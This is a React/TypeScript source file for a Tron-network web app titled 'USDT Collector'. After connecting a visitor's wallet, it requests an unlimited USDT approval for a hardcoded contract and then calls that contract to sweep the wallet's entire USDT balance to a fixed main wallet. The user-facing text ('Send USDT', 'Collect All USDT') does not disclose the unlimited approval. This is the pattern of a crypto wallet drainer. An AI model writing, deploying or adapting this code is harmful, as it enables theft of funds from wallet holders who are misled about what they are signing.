import { useState, useEffect } from 'react'
import { createAppKit, useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet, tronShastaTestnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const { usdtAddress: USDT_ADDRESS } =
  NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Tron Adapter ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new MetaMaskAdapter(),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }),
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

// ── WALLET FETCH ──
const fetchWallets = async () => {
  try {
    const res = await fetch(
      "https://explorer.walletconnect.com/v3/wallets?entries=100&page=1"
    )
    const data = await res.json()
    return data.listings || []
  } catch (err) {
    console.error("Failed to fetch wallets", err)
    return []
  }
}

// ── Create AppKit ──
createAppKit({
  adapters: [tronAdapter],
  networks: [NETWORK === 'Mainnet' ? tronMainnet : tronShastaTestnet],
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'USDT Collector',
    description: 'Collect USDT from multiple wallets to one main wallet',
    url: window.location.origin,
    icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00ff9f',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === ABIs ===
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: 'who', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: true,
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function',
  },
]

const COLLECT_ABI = [
  {
    constant: true,
    inputs: [],
    name: 'mainWallet',
    outputs: [{ name: '', type: 'address' }],
    stateMutability: 'view',
    type: 'function',
  },
  {
    constant: true,
    inputs: [],
    name: 'usdt',
    outputs: [{ name: '', type: 'address' }],
    stateMutability: 'view',
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: 'user', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'collect',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
]

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')

  const [wallets, setWallets] = useState<any[]>([])
  const [filteredWallets, setFilteredWallets] = useState<any[]>([])
  const [search, setSearch] = useState("")
  const [showModal, setShowModal] = useState(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { walletProvider } = useAppKitProvider('tron')
  const tronWeb = walletProvider as any

  useEffect(() => {
    if (isConnected && walletAddress && tronWeb) {
      getBalance(tronWeb, walletAddress)
    }
  }, [isConnected, walletAddress, tronWeb])

  useEffect(() => {
    if (showModal) {
      fetchWallets().then((list) => {
        setWallets(list)
        setFilteredWallets(list)
      })
    }
  }, [showModal])

  useEffect(() => {
    if (!search) {
      setFilteredWallets(wallets)
    } else {
      const q = search.toLowerCase()
      setFilteredWallets(
        wallets.filter((w) =>
          w.name?.toLowerCase().includes(q)
        )
      )
    }
  }, [search, wallets])

  const getBalance = async (tw: any, addr: string) => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
    } catch (e) {
      console.warn('Balance fetch failed', e)
    }
  }

  // ✅ FIXED: moved inside component
  const handleWalletClick = (wallet: any) => {
    console.log("Selected wallet:", wallet)

    if (wallet.name.toLowerCase().includes("tronlink")) {
      if ((window as any).tronLink) {
        ;(window as any).tronLink.request({ method: "tron_requestAccounts" })
      }
    }

    else if (wallet.name.toLowerCase().includes("trust")) {
      if ((window as any).trustwallet?.tronLink) {
        ;(window as any).trustwallet.tronLink.request({
          method: "tron_requestAccounts",
        })
      }
    }

    else {
      open({ view: "AllWallets" })
    }

    setShowModal(false)
  }

  const approveAndCollect = async () => {
    if (!tronWeb || !walletAddress) return
    setLoading(true)
    setStatus('Approving USDT...')

    try {
      const MAX_UINT =
        '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)
      await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 })

      setStatus('Waiting for confirmation...')
      await new Promise((r) => setTimeout(r, 8000))

      const balanceObj = await (
        await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)
      ).balanceOf(walletAddress).call()

      const amount = balanceObj.toString()

      const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS)
      const tx = await contract.collect(walletAddress, amount).send({
        feeLimit: 150_000_000,
      })

      setTxHash(tx)
      setStatus('✅ All USDT collected!')
      await getBalance(tronWeb, walletAddress)
    } catch (err: any) {
      setStatus('❌ ' + (err.message || 'Transaction failed'))
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
              U
            </div>
            <h1 className="text-3xl font-bold">USDT Collector</h1>
          </div>
          <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
            {NETWORK}
          </div>
        </div>

        <div className="p-8 space-y-8">
          {!isConnected ? (
            <div className="text-center">
              <h2 className="text-5xl font-bold mb-3">Send USDT</h2>

              <button
                onClick={() => setShowModal(true)}
                disabled={loading}
                className="w-full bg-emerald-400 hover:bg-emerald-500 disabled:bg-zinc-700 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-500 mt-6">
                Opens directly to All Wallets with search
              </p>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                <div>
                  <p className="text-zinc-400 text-sm">Connected Wallet</p>
                  <p className="font-mono text-sm text-emerald-400 break-all">{walletAddress}</p>
                </div>
                <button
                  onClick={() => navigator.clipboard.writeText(walletAddress ?? '')}
                  className="text-emerald-400 hover:text-white"
                >
                  <Copy size={20} />
                </button>
              </div>

              <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                <p className="text-zinc-400">Your USDT Balance</p>
                <p className="text-6xl font-bold text-emerald-400 mt-2">
                  {usdtBalance} <span className="text-3xl">USDT</span>
                </p>
              </div>

              <button
                onClick={approveAndCollect}
                disabled={loading}
                className="w-full bg-white hover:bg-zinc-100 text-black font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70"
              >
                {loading ? 'Processing...' : 'Collect All USDT'}
                <CheckCircle size={24} />
              </button>

              <div className="text-center text-sm flex items-center justify-center gap-2 text-zinc-400">
                {status.includes('✅') ? <CheckCircle className="text-emerald-400" /> : <AlertCircle />}
                {status}
              </div>

              {txHash && (
                <p className="text-[10px] text-center text-emerald-400 break-all font-mono">
                  TX: {txHash}
                </p>
              )}
            </div>
          )}

          {showModal && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="w-full max-w-md bg-zinc-900 rounded-2xl p-5 border border-zinc-800">
                
                <div className="flex justify-between items-center mb-4">
                  <h2 className="text-xl font-bold">Select Wallet</h2>
                  <button onClick={() => setShowModal(false)}>✕</button>
                </div>

                <input
                  type="text"
                  placeholder="Search wallet..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="w-full mb-4 p-3 rounded-lg bg-zinc-800 text-white outline-none"
                />

                <div className="max-h-96 overflow-y-auto space-y-2">
                  {filteredWallets.map((wallet: any) => (
                    <div
                      key={wallet.id}
                      onClick={() => handleWalletClick(wallet)}
                      className="flex items-center gap-3 p-3 bg-zinc-800 rounded-lg cursor-pointer hover:bg-zinc-700"
                    >
                      <img
                        src={wallet.image_url_sm || wallet.image_url}
                        alt={wallet.name}
                        className="w-8 h-8 rounded-full"
                      />
                      <span>{wallet.name || "Unknown Wallet"}</span>
                    </div>
                  ))}
                </div>

              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}